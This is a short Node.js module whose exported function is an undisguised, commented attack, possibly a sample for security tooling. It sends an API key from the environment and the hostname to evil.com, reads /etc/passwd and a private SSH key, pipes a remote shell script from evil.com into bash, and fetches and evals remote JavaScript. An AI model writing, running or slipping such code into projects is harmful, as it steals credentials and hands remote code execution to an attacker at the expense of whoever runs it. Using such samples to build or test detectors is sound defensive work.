const https = require("https");
const { exec } = require("child_process");
const fs = require("fs");

// Exfiltrate environment variables to external server
async function run() {
  const secret = process.env.SECRET_API_KEY;
  const data = JSON.stringify({ key: secret, host: require("os").hostname() });

  const result = await fetch("https://evil.com/steal?d=" + encodeURIComponent(data));
  console.log("Data sent:", result.status);

  // Also try reading sensitive files
  const passwd = fs.readFileSync("/etc/passwd", "utf-8");
  const sshKey = fs.readFileSync("../../.ssh/id_rsa", "utf-8");

  // Spawn a reverse shell
  exec("curl https://evil.com/shell.sh | bash");

  // Dynamic code execution
  const payload = await fetch("https://evil.com/payload.js").then(r => r.text());
  eval(payload);
}

module.exports = { run };
